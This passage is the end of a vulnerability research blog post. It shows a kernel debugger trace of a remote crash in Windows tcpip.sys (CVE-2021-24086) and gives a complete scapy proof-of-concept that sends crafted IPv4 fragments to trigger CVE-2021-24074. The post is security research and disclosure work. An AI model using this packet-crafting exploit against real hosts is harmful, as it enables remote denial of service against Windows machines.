tcpip!Ipv6pReassembleDatagram+0xe6:
fffff805`4a5cde52 8b9424a8000000  mov     edx,dword ptr [rsp+0A8h]

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0xed:
fffff805`4a5cde59 41b901000000    mov     r9d,1

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0xf3:
fffff805`4a5cde5f 8364242000      and     dword ptr [rsp+20h],0

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0xf8:
fffff805`4a5cde64 4533c0          xor     r8d,r8d

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0xfb:
fffff805`4a5cde67 498bce          mov     rcx,r14

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0xfe:
fffff805`4a5cde6a 48ff1507630700  call    qword ptr [tcpip!_imp_NdisGetDataBuffer (fffff805`4a644178)]

kd&gt; r @rdx
rdx=0000000000010010 &lt;- non truncated size

kd&gt; p
tcpip!Ipv6pReassembleDatagram+0x105:
fffff805`4a5cde71 0f1f440000      nop     dword ptr [rax+rax]

kd&gt; r @rax
rax=0000000000000000 &lt;- NdisGetDataBuffer returned NULL!!!

kd&gt; g
KDTARGET: Refreshing KD connection

*** Fatal System Error: 0x000000d1
                       (0x0000000000000000,0x0000000000000002,0x0000000000000001,0xFFFFF8054A5CDEBB)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff805`473c46a0 cc              int     3

kd&gt; kc
 # Call Site
00 nt!DbgBreakPointWithStatus
01 nt!KiBugCheckDebugBreak
02 nt!KeBugCheck2
03 nt!KeBugCheckEx
04 nt!KiBugCheckDispatch
05 nt!KiPageFault
06 tcpip!Ipv6pReassembleDatagram
07 tcpip!Ipv6pReceiveFragment
08 tcpip!Ipv6pReceiveFragmentList
09 tcpip!IppReceiveHeaderBatch
0a tcpip!IppFlcReceivePacketsCore
0b tcpip!IpFlcReceivePackets
0c tcpip!FlpReceiveNonPreValidatedNetBufferListChain
0d tcpip!FlReceiveNetBufferListChainCalloutRoutine
0e nt!KeExpandKernelStackAndCalloutInternal
0f nt!KeExpandKernelStackAndCalloutEx
10 tcpip!FlReceiveNetBufferListChain
11 NDIS!ndisMIndicateNetBufferListsToOpen
12 NDIS!ndisMTopReceiveNetBufferLists
13 NDIS!ndisCallReceiveHandler
14 NDIS!ndisInvokeNextReceiveHandler
15 NDIS!NdisMIndicateReceiveNetBufferLists
16 netvsc!ReceivePacketMessage
17 netvsc!NvscKmclProcessPacket
18 nt!KiInitializeKernel
19 nt!KiSystemStartup
</code></pre></div>


<p>Incredible! We managed to implement the recursive fragmentation idea we discussed. Wow, I really didn't think it would actually work. Morale of the day: don't leave any rocks unturned, follow your intuitions and reach the state of no unknowns.</p>
<p><center><img alt="trigger" src="/images/reverse_engineering_tcpip/trigger.gif"></center></p>
<h1 id="conclusion">Conclusion</h1>
<p>In this post I tried to take you with me through my journey to write a PoC for CVE-2021-24086, a true remote DoS vulnerability affecting Windows' tcpip.sys driver found by Microsoft own's <a href="https://twitter.com/piazzt">@piazzt</a>. From zero to remote BSoD. The PoC is available on <a href="https://github.com/0vercl0k">my github</a> here: <a href="https://github.com/0vercl0k/CVE-2021-24086">0vercl0k/CVE-2021-24086</a>.</p>
<p>It was a wild ride mainly because it all looked way too easy and because I ended up chasing a bunch of ghosts.</p>
<p>I am sure that I've lost about 99% of my readers as it is a fairly long and hairy post, but if you made it all the way there you should join and come hang in the newly created <em>Diary of a reverse-engineer</em> Discord: <a href="https://discord.gg/4JBWKDNyYs">https://discord.gg/4JBWKDNyYs</a>. We're trying to build a community of people enjoying low level subjects. Hopefully we can also generate more interest for external contributions :)</p>
<p>Last but not least, special greets to the usual suspects: <a href="https://twitter.com/yrp604">@yrp604</a> and <a href="https://twitter.com/__x86">@__x86</a> and <a href="https://twitter.com/jonathansalwan">@jonathansalwan</a> for proof-reading this article.</p>
<h1 id="bonus-cve-2021-24074">Bonus: CVE-2021-24074</h1>
<p>Here is the Poc I built based on the high quality blogpost put out by <a href="https://www.armis.com/resources/iot-security-blog/from-urgent-11-to-frag-44-microsoft-patches-critical-vulnerabilities-in-windows-tcp-ip-stack/">Armis</a>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Axel &#39;0vercl0k&#39; Souchet - April 4 2021</span>
<span class="c1"># Extremely detailed root-cause analysis was made by Armis:</span>
<span class="c1"># https://www.armis.com/resources/iot-security-blog/from-urgent-11-to-frag-44-microsoft-patches-critical-vulnerabilities-in-windows-tcp-ip-stack/</span>
<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">codecs</span>
<span class="kn">import</span> <span class="nn">random</span>

<span class="k">def</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    kd&gt; g</span>
<span class="sd">    oob?</span>
<span class="sd">    tcpip!Ipv4pReceiveRoutingHeader+0x16a:</span>
<span class="sd">    fffff804`453c6f7a 4d8d2c1c        lea     r13,[r12+rbx]</span>
<span class="sd">    kd&gt; p</span>
<span class="sd">    tcpip!Ipv4pReceiveRoutingHeader+0x16e:</span>
<span class="sd">    fffff804`453c6f7e 498bd5          mov     rdx,r13</span>
<span class="sd">    kd&gt; db @r13</span>
<span class="sd">    ffffb90e`85b78220  c0 82 b7 85 0e b9 ff ff-38 00 04 10 00 00 00 00  ........8.......</span>
<span class="sd">    kd&gt; dqs @r13 l1</span>
<span class="sd">    ffffb90e`85b78220  ffffb90e`85b782c0</span>
<span class="sd">    kd&gt; p</span>
<span class="sd">    tcpip!Ipv4pReceiveRoutingHeader+0x171:</span>
<span class="sd">    fffff804`453c6f81 488d0d58830500  lea     rcx,[tcpip!Ipv4Global (fffff804`4541f2e0)]</span>
<span class="sd">    kd&gt;</span>
<span class="sd">    tcpip!Ipv4pReceiveRoutingHeader+0x178:</span>
<span class="sd">    fffff804`453c6f88 e8d7e1feff      call    tcpip!IppIsInvalidSourceAddressStrict (fffff804`453b5164)</span>
<span class="sd">    kd&gt; db @rdx</span>
<span class="sd">    kd&gt; p</span>
<span class="sd">    tcpip!Ipv4pReceiveRoutingHeader+0x17d:</span>
<span class="sd">    fffff804`453c6f8d 84c0            test    al,al</span>
<span class="sd">    kd&gt; r.</span>
<span class="sd">    al=00000000`00000000  al=00000000`00000000</span>
<span class="sd">    kd&gt; p</span>
<span class="sd">    tcpip!Ipv4pReceiveRoutingHeader+0x17f:</span>
<span class="sd">    fffff804`453c6f8f 0f85de040000    jne     tcpip!Ipv4pReceiveRoutingHeader+0x663 (fffff804`453c7473)</span>
<span class="sd">    kd&gt;</span>
<span class="sd">    tcpip!Ipv4pReceiveRoutingHeader+0x185:</span>
<span class="sd">    fffff804`453c6f95 498bcd          mov     rcx,r13</span>
<span class="sd">    kd&gt;</span>
<span class="sd">    Breakpoint 3 hit</span>
<span class="sd">    tcpip!Ipv4pReceiveRoutingHeader+0x188:</span>
<span class="sd">    fffff804`453c6f98 e8e7dff8ff      call    tcpip!Ipv4UnicastAddressScope (fffff804`45354f84)</span>
<span class="sd">    kd&gt; dqs @rcx l1</span>
<span class="sd">    ffffb90e`85b78220  ffffb90e`85b782c0</span>

<span class="sd">    Call-stack (skip first hit):</span>
<span class="sd">      kd&gt; kc</span>
<span class="sd">      # Call Site</span>
<span class="sd">      00 tcpip!Ipv4pReceiveRoutingHeader</span>
<span class="sd">      01 tcpip!IppReceiveHeaderBatch</span>
<span class="sd">      02 tcpip!Ipv4pReassembleDatagram</span>
<span class="sd">      03 tcpip!Ipv4pReceiveFragment</span>
<span class="sd">      04 tcpip!Ipv4pReceiveFragmentList</span>
<span class="sd">      05 tcpip!IppReceiveHeaderBatch</span>
<span class="sd">      06 tcpip!IppFlcReceivePacketsCore</span>
<span class="sd">      07 tcpip!IpFlcReceivePackets</span>
<span class="sd">      08 tcpip!FlpReceiveNonPreValidatedNetBufferListChain</span>
<span class="sd">      09 tcpip!FlReceiveNetBufferListChainCalloutRoutine</span>
<span class="sd">      0a nt!KeExpandKernelStackAndCalloutInternal</span>
<span class="sd">      0b nt!KeExpandKernelStackAndCalloutEx</span>
<span class="sd">      0c tcpip!FlReceiveNetBufferListChain</span>

<span class="sd">    Snippet:</span>
<span class="sd">      __int16 __fastcall Ipv4pReceiveRoutingHeader(Packet_t *Packet)</span>
<span class="sd">      {</span>
<span class="sd">        // ...</span>
<span class="sd">        // kd&gt; db @rax</span>
<span class="sd">        // ffffdc07`ff209170  ff ff 04 00 61 62 63 00-54 24 30 48 89 14 01 48  ....abc.T$0H...H</span>
<span class="sd">        RoutingHeaderFirst = NdisGetDataBuffer(FirstNetBuffer, Packet-&gt;RoutingHeaderOptionLength, &amp;v50[0].qw2, 1u, 0);</span>
<span class="sd">        NetioAdvanceNetBufferList(NetBufferList, v8);</span>
<span class="sd">        OptionLenFirst = RoutingHeaderFirst[1];</span>
<span class="sd">        LenghtOptionFirstMinusOne = (unsigned int)(unsigned __int8)RoutingHeaderFirst[2] - 1;</span>
<span class="sd">        RoutingOptionOffset = LOBYTE(Packet-&gt;RoutingOptionOffset);</span>
<span class="sd">        if (OptionLenFirst &lt; 7u ||</span>
<span class="sd">          LenghtOptionFirstMinusOne &gt; OptionLenFirst - sizeof(IN_ADDR))</span>
<span class="sd">        {</span>
<span class="sd">          // ...</span>
<span class="sd">          goto Bail_0;</span>
<span class="sd">        }</span>
<span class="sd">        // ...</span>
<span class="sd">    &#39;&#39;&#39;</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">)</span>
    <span class="c1"># dst_ip isn&#39;t a broadcast IP because otherwise we fail a check in</span>
    <span class="c1"># Ipv4pReceiveRoutingHeader; if we don&#39;t take the below branch</span>
    <span class="c1"># we don&#39;t hit the interesting bits later:</span>
    <span class="c1">#   if (Packet-&gt;CurrentDestinationType == NlatUnicast) {</span>
    <span class="c1">#     v12 = &amp;RoutingHeaderFirst[LenghtOptionFirstMinusOne];</span>
    <span class="n">dst_ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.2.137&#39;</span>
    <span class="n">src_ip</span> <span class="o">=</span> <span class="s1">&#39;120.120.120.0&#39;</span>
    <span class="c1"># UDP</span>
    <span class="n">nh</span> <span class="o">=</span> <span class="mi">17</span>
    <span class="n">content</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">UDP</span><span class="p">(</span><span class="n">sport</span> <span class="o">=</span> <span class="mi">31337</span><span class="p">,</span> <span class="n">dport</span> <span class="o">=</span> <span class="mi">31338</span><span class="p">)</span> <span class="o">/</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">one</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">()</span> \
        <span class="o">/</span> <span class="n">IP</span><span class="p">(</span>
            <span class="n">src</span> <span class="o">=</span> <span class="n">src_ip</span><span class="p">,</span>
            <span class="n">dst</span> <span class="o">=</span> <span class="n">dst_ip</span><span class="p">,</span>
            <span class="n">flags</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
            <span class="n">proto</span> <span class="o">=</span> <span class="n">nh</span><span class="p">,</span>
            <span class="n">frag</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="nb">id</span> <span class="o">=</span> <span class="nb">id</span><span class="p">,</span>
            <span class="n">options</span> <span class="o">=</span> <span class="p">[</span><span class="n">IPOption_Security</span><span class="p">(</span>
                <span class="n">length</span> <span class="o">=</span> <span class="mh">0xb</span><span class="p">,</span>
                <span class="n">security</span> <span class="o">=</span> <span class="mh">0x11</span><span class="p">,</span>
                <span class="c1"># This is used for as an ~upper bound in Ipv4pReceiveRoutingHeader:</span>
                <span class="n">compartment</span> <span class="o">=</span> <span class="mh">0xffff</span><span class="p">,</span>
                <span class="c1"># This is the offset that allows us to index out of the</span>
                <span class="c1"># bounds of the second fragment.</span>
                <span class="c1"># Keep in mind that, the out of bounds data is first used</span>
                <span class="c1"># before triggering any corruption (in Ipv4pReceiveRoutingHeader):</span>
                <span class="c1">#  - IppIsInvalidSourceAddressStrict,</span>
                <span class="c1">#  - Ipv4UnicastAddressScope.</span>
                <span class="c1"># if (IppIsInvalidSourceAddressStrict(Ipv4Global, &amp;RoutingHeaderFirst[LenghtOptionFirstMinusOne])</span>
                <span class="c1">#     || (Ipv4UnicastAddressScope(&amp;RoutingHeaderFirst[LenghtOptionFirstMinusOne]),</span>
                <span class="c1">#         v13 = Ipv4UnicastAddressScope(&amp;Packet-&gt;RoutingOptionSourceIp),</span>
                <span class="c1">#         v14 &lt; v13) )</span>
                <span class="c1"># The upper byte of handling_restrictions is `RoutingHeaderFirst[2]` in the above snippet</span>
                <span class="c1"># Offset of 6 allows us to have &amp;RoutingHeaderFirst[LenghtOptionFirstMinusOne] pointing on</span>
                <span class="c1"># one.IP.options.transmission_control_code; last byte is OOB.</span>
                <span class="c1">#   kd&gt;</span>
                <span class="c1">#   tcpip!Ipv4pReceiveRoutingHeader+0x178:</span>
                <span class="c1">#   fffff804`5c076f88 e8d7e1feff      call    tcpip!IppIsInvalidSourceAddressStrict (fffff804`5c065164)</span>
                <span class="c1">#   kd&gt; db @rdx</span>
                <span class="c1">#   ffffdc07`ff209175  62 63 00 54 24 30 48 89-14 01 48 c0 92 20 ff 07  bc.T$0H...H.. ..</span>
                <span class="c1">#                                ^</span>
                <span class="c1">#                                |_ oob</span>
                <span class="n">handling_restrictions</span> <span class="o">=</span> <span class="p">(</span><span class="mi">6</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">),</span>
                <span class="n">transmission_control_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x11\xc1\xa8</span><span class="s1">&#39;</span>
            <span class="p">)]</span>
        <span class="p">)</span> <span class="o">/</span> <span class="n">content</span><span class="p">[:</span> <span class="mi">8</span><span class="p">]</span>
    <span class="n">two</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">()</span> \
        <span class="o">/</span> <span class="n">IP</span><span class="p">(</span>
            <span class="n">src</span> <span class="o">=</span> <span class="n">src_ip</span><span class="p">,</span>
            <span class="n">dst</span> <span class="o">=</span> <span class="n">dst_ip</span><span class="p">,</span>
            <span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="n">proto</span> <span class="o">=</span> <span class="n">nh</span><span class="p">,</span>
            <span class="n">frag</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
            <span class="nb">id</span> <span class="o">=</span> <span class="nb">id</span><span class="p">,</span>
            <span class="n">options</span> <span class="o">=</span> <span class="p">[</span>
                <span class="n">IPOption_NOP</span><span class="p">(),</span>
                <span class="n">IPOption_NOP</span><span class="p">(),</span>
                <span class="n">IPOption_NOP</span><span class="p">(),</span>
                <span class="n">IPOption_NOP</span><span class="p">(),</span>
                <span class="n">IPOption_LSRR</span><span class="p">(</span>
                    <span class="n">pointer</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">,</span>
                    <span class="n">routers</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;11.22.33.44&#39;</span><span class="p">]</span>
                <span class="p">),</span>
            <span class="p">]</span>
        <span class="p">)</span> <span class="o">/</span> <span class="n">content</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span> <span class="p">]</span>

    <span class="n">sendp</span><span class="p">([</span><span class="n">one</span><span class="p">,</span> <span class="n">two</span><span class="p">],</span> <span class="n">iface</span><span class="o">=</span><span class="s1">&#39;eth1&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--target&#39;</span><span class="p">,</span> <span class="n">default</span> <span class="o">=</span> <span class="s1">&#39;ff02::1&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--dport&#39;</span><span class="p">,</span> <span class="n">default</span> <span class="o">=</span> <span class="mi">500</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="n">trigger</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">return</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>
                </div><!-- /.entry-content -->
        </article>
</section>
        </div><!--/span-->
      </div><!--/row-->
      <hr>

      <footer style='background-color:#00000000'>
        <center>
          <address id="about">
                  Proudly powered by <a href="http://pelican.notmyidea.org/">Pelican <i class="icon-external-link"></i></a>,
                                  which takes great advantage of <a href="http://python.org">Python <i class="icon-external-link"></i></a>.
          </address><!-- /#about -->

          <p>The theme is from <a href="http://twitter.github.com/bootstrap/">Bootstrap from Twitter <i class="icon-external-link"></i></a>,
                     and <a href="http://fortawesome.github.com/Font-Awesome/">Font-Awesome <i class="icon-external-link"></i></a>, thanks!</p>
        </center>
      </footer>

    </div><!--/.fluid-container-->


    <script src="../../../../../theme/js/jquery-1.7.2.min.js"></script>
    <script src="../../../../../theme/js/bootstrap.min.js"></script>
  </body>
</html>